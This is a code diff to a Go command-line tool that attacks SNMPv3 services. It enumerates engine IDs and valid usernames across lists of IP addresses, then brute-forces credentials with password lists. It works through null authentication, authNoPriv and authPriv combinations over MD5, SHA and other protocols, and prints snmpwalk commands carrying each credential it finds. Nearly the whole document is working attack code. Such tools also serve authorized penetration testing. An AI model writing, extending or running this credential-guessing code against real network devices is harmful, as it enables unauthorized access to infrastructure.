@@ -55,14 +55,52 @@ func (l *SNMPLogger) Printf(format string, v ...interface{}) {
 	fmt.Printf("SNMP DEBUG: "+format, v...)
 }
 
-func NewSNMPv3Client(config *SNMPv3Config) (*SNMPv3Client, error) {
+// NewSNMPv3EnumClient - specifically for engine enumeration
+func NewSNMPv3EnumClient(config *SNMPv3Config) (*SNMPv3Client, error) {
 	client := &gosnmp.GoSNMP{
 		Target:        config.Target,
 		Port:          uint16(config.Port),
 		Version:       gosnmp.Version3,
 		Timeout:       time.Duration(config.TimeoutSecs) * time.Second,
 		SecurityModel: gosnmp.UserSecurityModel,
-		MsgFlags:      gosnmp.AuthPriv,
+		MsgFlags:      gosnmp.NoAuthNoPriv,
+		SecurityParameters: &gosnmp.UsmSecurityParameters{
+			UserName: config.Username,
+		},
+		Transport: config.Transport,
+	}
+
+	err := client.Connect()
+	if err != nil {
+		return nil, err
+	}
+
+	// Trigger discovery with Get request, ignore errors
+	oids := []string{"1.3.6.1.2.1.1.1.0"}
+	_, _ = client.Get(oids)
+
+	return &SNMPv3Client{client: client}, nil
+}
+
+// NewSNMPv3AuthClient - for user enumeration and brute force
+func NewSNMPv3AuthClient(config *SNMPv3Config) (*SNMPv3Client, error) {
+	var msgFlags gosnmp.SnmpV3MsgFlags
+	switch strings.ToLower(config.SecurityLevel) {
+	case "authpriv":
+		msgFlags = gosnmp.AuthPriv
+	case "authnopriv":
+		msgFlags = gosnmp.AuthNoPriv
+	default:
+		msgFlags = gosnmp.NoAuthNoPriv
+	}
+
+	client := &gosnmp.GoSNMP{
+		Target:        config.Target,
+		Port:          uint16(config.Port),
+		Version:       gosnmp.Version3,
+		Timeout:       time.Duration(config.TimeoutSecs) * time.Second,
+		SecurityModel: gosnmp.UserSecurityModel,
+		MsgFlags:      msgFlags,
 		SecurityParameters: &gosnmp.UsmSecurityParameters{
 			UserName:                 config.Username,
 			AuthenticationProtocol:   getAuthProtocol(config.AuthProtocol),
@@ -74,20 +112,7 @@ func NewSNMPv3Client(config *SNMPv3Config) (*SNMPv3Client, error) {
 	}
 
 	err := client.Connect()
-	if err != nil {
-		fmt.Printf("SNMP Error for user %s: %v\n", config.Username, err)
-		if client.Conn != nil {
-			// Read the raw response
-			buf := make([]byte, 4096)
-			n, _ := client.Conn.Read(buf)
-			if n > 0 {
-				fmt.Printf("Raw response: %x\n", buf[:n])
-			}
-		}
-		return nil, fmt.Errorf("connect error: %v", err)
-	}
-
-	return &SNMPv3Client{client: client}, nil
+	return &SNMPv3Client{client: client}, err
 }
 
 func (c *SNMPv3Client) Get(oids []string, showDetails bool) (map[string]interface{}, error) {
@@ -218,20 +243,21 @@ func getResultMessage(err error) string {
 func performEnumeration(ips []string, protocol string, port int) []SNMPResult {
 	results := []SNMPResult{}
 	config := &SNMPv3Config{
-		Port:         port,
-		Username:     "myuser",
-		AuthProtocol: "SHA",
-		AuthPassword: "authpass",
-		PrivProtocol: "AES",
-		PrivPassword: "privpass",
-		TimeoutSecs:  2,
-		Transport:    protocol,
+		Port:          port,
+		Username:      "myuser",
+		AuthProtocol:  "SHA",
+		AuthPassword:  "authpass",
+		PrivProtocol:  "AES",
+		PrivPassword:  "privpass",
+		TimeoutSecs:   2,
+		Transport:     protocol,
+		SecurityLevel: "noAuthNoPriv",
 	}
 
 	for _, ip := range ips {
 		fmt.Printf("\n=== Testing IP: %s ===\n", ip)
 		config.Target = ip
-		client, err := NewSNMPv3Client(config)
+		client, err := NewSNMPv3EnumClient(config)
 		if err != nil {
 			results = append(results, SNMPResult{
 				IP:      ip,
@@ -242,12 +268,23 @@ func performEnumeration(ips []string, protocol string, port int) []SNMPResult {
 		}
 		defer client.Close()
 
+		if params, ok := client.client.SecurityParameters.(*gosnmp.UsmSecurityParameters); ok {
+			fmt.Printf("\nSNMP Engine Details:\n")
+			fmt.Printf("Authorization Engine ID (hex): %x\n", params.AuthoritativeEngineID)
+			fmt.Printf("Authorization Engine Boots: %d\n", params.AuthoritativeEngineBoots)
+			fmt.Printf("Authorization Engine Time: %d\n", params.AuthoritativeEngineTime)
+
+			fmt.Printf("\nParsed Authorization Engine ID:\n")
+			engineID := []byte(params.AuthoritativeEngineID)
+			parseEngineID(engineID)
+		}
+
 		oids := []string{"1.3.6.1.2.1.1.1.0"}
 		_, err = client.Get(oids, true)
 		results = append(results, SNMPResult{
 			IP:      ip,
 			Success: err == nil,
-			Message: err.Error(),
+			Message: getResultMessage(err),
 		})
 	}
 	return results
@@ -282,24 +319,35 @@ func main() {
 		log.Fatal("Must specify either --enum, --userenum, or --brute flag")
 	}
 
-	ips := getIPList(*ipList, *ipFile)
-	if len(ips) == 0 {
-		log.Fatal("No valid IP addresses provided")
-	}
-
 	if *enumFlag {
-		results := performEnumeration(ips, *protocol, *port)
+		results := performEnumeration(getIPList(*ipList, *ipFile), *protocol, *port)
 		displayEnumResults(results)
 	} else if *userEnumFlag {
 		if *userFile == "" {
 			log.Fatal("Username enumeration requires --userfile")
 		}
-		results := performUserEnum(ips, *userFile, *protocol, *port)
+		results := performUserEnum(getIPList(*ipList, *ipFile), *userFile, *protocol, *port)
 		saveUserResults(results)
 	} else if *bruteFlag {
 		if *userFile == "" || *passFile == "" {
 			log.Fatal("Brute force requires --userfile and --passfile")
 		}
+
+		// First check if userFile contains IP:username combos
+		content, err := os.ReadFile(*userFile)
+		if err != nil {
+			log.Fatalf("Failed to read user file: %v", err)
+		}
+		hasIPUserCombos := strings.Contains(string(content), ":")
+
+		// Only check for IPs if we don't have combos
+		if !hasIPUserCombos {
+			ips := getIPList(*ipList, *ipFile)
+			if len(ips) == 0 {
+				log.Fatal("When using a file with usernames only, you must specify target IPs with -ips or -ipfile")
+			}
+		}
+
 		results := performBruteForce(*userFile, *passFile, *encFile, *ipList, *ipFile, *protocol, *workers, *port)
 		displayBruteResults(results)
 	}
@@ -334,43 +382,13 @@ func performUserEnum(ips []string, userFile string, protocol string, port int) [
 
 			for _, authProto := range authProtos {
 				config.AuthProtocol = authProto
-				client, err := NewSNMPv3Client(config)
+				client, err := NewSNMPv3AuthClient(config)
 
-				if err != nil {
-					errLower := strings.ToLower(err.Error())
-					if strings.Contains(errLower, "unknown user") {
-						continue // Try next auth protocol
-					}
-					// Any other connection error might indicate a valid user
-					if !userFound {
-						userFound = true
-						results = append(results, SNMPResult{
-							IP:           ip,
-							Username:     username,
-							AuthProtocol: authProto,
-							Success:      true,
-						})
-						fmt.Printf("[+] Valid username found on %s: %s\n", ip, username)
-					}
-					if client != nil {
-						client.Close()
-					}
-					break // Found valid user, no need to try other auth protocols
-				}
+				if err == nil { // Connection successful
+					oids := []string{"1.3.6.1.2.1.1.1.0"}
+					_, err = client.Get(oids, false)
 
-				oids := []string{"1.3.6.1.2.1.1.1.0"}
-				_, err = client.Get(oids, false)
-
-				if err != nil {
-					errLower := strings.ToLower(err.Error())
-					if strings.Contains(errLower, "unknown user") {
-						client.Close()
-						break // User doesn't exist, try next username
-					} else if strings.Contains(errLower, "timeout") || strings.Contains(errLower, "nil") {
-						client.Close()
-						continue // Try next auth protocol
-					} else {
-						// Any other error might indicate a valid user
+					if err == nil { // Get successful
 						if !userFound {
 							userFound = true
 							results = append(results, SNMPResult{
@@ -379,14 +397,13 @@ func performUserEnum(ips []string, userFile string, protocol string, port int) [
 								AuthProtocol: authProto,
 								Success:      true,
 							})
-							fmt.Printf("[+] Valid username found on %s: %s\n", ip, username)
+							color.Green("[+] Valid username found on %s: %s", ip, username)
 						}
 						client.Close()
-						break // Found valid user, no need to try other auth protocols
+						break
 					}
+					client.Close()
 				}
-
-				client.Close()
 			}
 
 			if !userFound {
@@ -468,12 +485,13 @@ func loadUserCombos(filename, ipList, ipFile string) ([]string, error) {
 			continue
 		}
 		if strings.Contains(line, ":") {
-			uniqueMap[line] = true
+			uniqueMap[line] = true // If line contains IP:username format, add directly
 		} else {
-			usernames = append(usernames, line)
+			usernames = append(usernames, line) // Otherwise store as username only
 		}
 	}
 
+	// This part might be inefficient - it tries every username against every IP
 	ips := getIPList(ipList, ipFile)
 	if len(ips) > 0 {
 		for _, ip := range ips {
@@ -516,13 +534,14 @@ func performBruteForce(userFile, passFile, encFile, ipList, ipFile, protocol str
 		encPasswords = passwords
 	}
 
-	// Order auth protocols by most common first
-	authProtos := []string{"SHA", "MD5", "SHA256", "SHA384", "SHA512", "SHA224"} // MD5 and SHA are most common
-	privProtos := []string{"AES", "DES"}                                         // AES is more common than DES
+	// Split auth protocols into basic and advanced
+	basicAuthProtos := []string{"MD5", "SHA"}
+	advancedAuthProtos := []string{"SHA256", "SHA384", "SHA512", "SHA224"}
+	privProtos := []string{"AES", "DES"}
 
 	nullAuthCombos := int32(len(userCombos))
-	authNoPrivCombos := int32(len(userCombos) * len(passwords) * len(authProtos))
-	authPrivCombos := int32(len(userCombos) * len(passwords) * len(encPasswords) * len(authProtos) * len(privProtos))
+	authNoPrivCombos := int32(len(userCombos) * len(passwords) * len(basicAuthProtos))
+	authPrivCombos := int32(len(userCombos) * len(passwords) * len(encPasswords) * len(basicAuthProtos) * len(privProtos))
 
 	totalCombos := nullAuthCombos + authNoPrivCombos + authPrivCombos
 
@@ -532,9 +551,9 @@ func performBruteForce(userFile, passFile, encFile, ipList, ipFile, protocol str
 	fmt.Printf("    - NULL Auth: %d (users:%d)\n",
 		nullAuthCombos, len(userCombos))
 	fmt.Printf("    - AuthNoPriv: %d (users:%d × passwords:%d × auth_protocols:%d)\n",
-		authNoPrivCombos, len(userCombos), len(passwords), len(authProtos))
+		authNoPrivCombos, len(userCombos), len(passwords), len(basicAuthProtos))
 	fmt.Printf("    - AuthPriv: %d (users:%d × passwords:%d × enc_passwords:%d × auth_protocols:%d × priv_protocols:%d)\n",
-		authPrivCombos, len(userCombos), len(passwords), len(encPasswords), len(authProtos), len(privProtos))
+		authPrivCombos, len(userCombos), len(passwords), len(encPasswords), len(basicAuthProtos), len(privProtos))
 	fmt.Printf("    - Total combinations: %d\n", totalCombos)
 
 	var progress int32
@@ -553,6 +572,7 @@ func performBruteForce(userFile, passFile, encFile, ipList, ipFile, protocol str
 				}
 				resultsMutex.Unlock()
 
+				// Try NULL auth first
 				currentProgress := atomic.AddInt32(&progress, 1)
 				if result := tryNullAuth(combo.ip, combo.username, protocol, currentProgress, totalCombos, port); result != nil {
 					resultsMutex.Lock()
@@ -562,8 +582,9 @@ func performBruteForce(userFile, passFile, encFile, ipList, ipFile, protocol str
 					continue
 				}
 
+				// Try basic AuthNoPriv (MD5/SHA) first
 				userFound := false
-				for _, authProto := range authProtos {
+				for _, authProto := range basicAuthProtos {
 					if userFound {
 						break
 					}
@@ -577,11 +598,39 @@ func performBruteForce(userFile, passFile, encFile, ipList, ipFile, protocol str
 							userFound = true
 							break
 						}
+					}
+				}
+				if userFound {
+					continue
+				}
 
-						if userFound {
+				// Try advanced AuthNoPriv if basic fails
+				for _, authProto := range advancedAuthProtos {
+					if userFound {
+						break
+					}
+					for _, pass := range passwords {
+						currentProgress = atomic.AddInt32(&progress, 1)
+						if result := tryAuthNoPriv(combo.ip, combo.username, pass, authProto, protocol, currentProgress, totalCombos, port); result != nil {
+							resultsMutex.Lock()
+							results = append(results, *result)
+							foundUsers[combo.username] = true
+							resultsMutex.Unlock()
+							userFound = true
 							break
 						}
+					}
+				}
+				if userFound {
+					continue
+				}
 
+				// Try AuthPriv only if everything else fails
+				for _, authProto := range basicAuthProtos {
+					if userFound {
+						break
+					}
+					for _, pass := range passwords {
 						for _, privProto := range privProtos {
 							for _, privPass := range encPasswords {
 								currentProgress = atomic.AddInt32(&progress, 1)
@@ -597,6 +646,9 @@ func performBruteForce(userFile, passFile, encFile, ipList, ipFile, protocol str
 							if userFound {
 								break
 							}
+						}
+						if userFound {
+							break
 						}
 					}
 				}
@@ -691,28 +743,34 @@ func tryNullAuth(ip, username, protocol string, current, total int32, port int) 
 		TimeoutSecs: 2,
 	}
 
-	client, err := NewSNMPv3Client(config)
-	if err == nil {
-		defer client.Close()
-		oids := []string{"1.3.6.1.2.1.1.1.0"}
-		_, err = client.Get(oids, false)
-		if err == nil {
-			color.Green("[+] [NULL Auth] SUCCESS: %s@%s", username, ip)
-			walkCmd := fmt.Sprintf("snmpwalk -v3 -l noAuthNoPriv -u %s %s", username, ip)
-			return &SNMPResult{
-				IP:       ip,
-				Username: username,
-				Success:  true,
-				Command:  walkCmd,
-				Message:  "NULL auth",
-			}
+	client, err := NewSNMPv3AuthClient(config)
+	if err != nil {
+		fmt.Printf("DEBUG [NULL Auth] Connection error: %v\n", err)
+		return nil
+	}
+	defer client.Close()
+
+	oids := []string{"1.3.6.1.2.1.1.1.0"}
+	result, err := client.client.Get(oids) // Get raw result to check variables
+	fmt.Printf("DEBUG [NULL Auth] Get error: %v\n", err)
+
+	// Check if we actually got data back
+	if err == nil && result != nil && len(result.Variables) > 0 && result.Variables[0].Value != nil {
+		color.Green("[+] [NULL Auth] SUCCESS: %s@%s", username, ip)
+		walkCmd := fmt.Sprintf("snmpwalk -v3 -l noAuthNoPriv -u %s %s", username, ip)
+		return &SNMPResult{
+			IP:       ip,
+			Username: username,
+			Success:  true,
+			Command:  walkCmd,
+			Message:  "NULL auth",
 		}
 	}
 	return nil
 }
 
 func tryAuthNoPriv(ip, username, password, authProto, protocol string, current, total int32, port int) *SNMPResult {
-	fmt.Printf("[*] [AuthNoPriv] Testing %s@%s (Protocol:%s Auth:%s) (%d/%d)\n",
+	fmt.Printf("[*] [AuthNoPriv] Testing %s@%s (Auth Protocol:%s Priv Protocol:NONE Auth Password:%s) (%d/%d)\n",
 		username, ip, authProto, password, current, total)
 	config := &SNMPv3Config{
 		Target:        ip,
@@ -725,7 +783,7 @@ func tryAuthNoPriv(ip, username, password, authProto, protocol string, current, 
 		SecurityLevel: "authNoPriv",
 	}
 
-	client, err := NewSNMPv3Client(config)
+	client, err := NewSNMPv3AuthClient(config)
 	if err != nil {
 		return nil
 	}
@@ -737,7 +795,8 @@ func tryAuthNoPriv(ip, username, password, authProto, protocol string, current, 
 		return nil
 	}
 
-	color.Green("[+] [AuthNoPriv] SUCCESS: %s@%s (Protocol:%s Auth:%s)",
+	// Modified success message to show both protocols
+	color.Green("[+] [AuthNoPriv] SUCCESS: %s@%s (Auth Protocol:%s Auth Password:%s)",
 		username, ip, authProto, password)
 	walkCmd := fmt.Sprintf("snmpwalk -v3 -l authNoPriv -u %s -a %s -A %s %s",
 		username, authProto, password, ip)
@@ -753,7 +812,7 @@ func tryAuthNoPriv(ip, username, password, authProto, protocol string, current, 
 }
 
 func tryAuthPriv(ip, username, authPass, privPass, authProto, privProto, protocol string, current, total int32, port int) *SNMPResult {
-	fmt.Printf("[*] [AuthPriv] Testing %s@%s (Protocols:%s/%s Auth:%s Priv:%s) (%d/%d)\n",
+	fmt.Printf("[*] [AuthPriv] Testing %s@%s (Auth Protocol:%s Priv Protocol:%s Auth Password:%s Priv Password:%s) (%d/%d)\n",
 		username, ip, authProto, privProto, authPass, privPass, current, total)
 	config := &SNMPv3Config{
 		Target:        ip,
@@ -768,7 +827,7 @@ func tryAuthPriv(ip, username, authPass, privPass, authProto, privProto, protoco
 		SecurityLevel: "authPriv",
 	}
 
-	client, err := NewSNMPv3Client(config)
+	client, err := NewSNMPv3AuthClient(config)
 	if err != nil {
 		return nil
 	}
